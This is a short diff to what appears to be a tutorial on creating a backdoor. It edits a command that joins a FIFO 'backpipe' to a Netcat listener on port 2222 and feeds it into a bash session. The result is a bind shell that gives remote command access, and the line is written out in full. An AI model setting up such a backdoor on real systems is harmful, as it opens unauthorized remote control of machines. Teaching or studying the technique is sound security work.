@@ -37,7 +37,7 @@ Next, we will need to create a **FIFO** backpipe:
 
 Next, let's start the backdoor:
 
-<pre>backpipe 0&lt;backpipe | nc -l 2222 1>backpipe</pre>
+<pre>/bin/bash backpipe 0&lt;backpipe | nc -l 2222 1>backpipe</pre>
 
 In the above command, we are creating a **Netcat listener** that forwards all input through a backpipe and then into a bash session.  It then takes the output of the bash session and puts it back into the **Netcat listener**. 
 
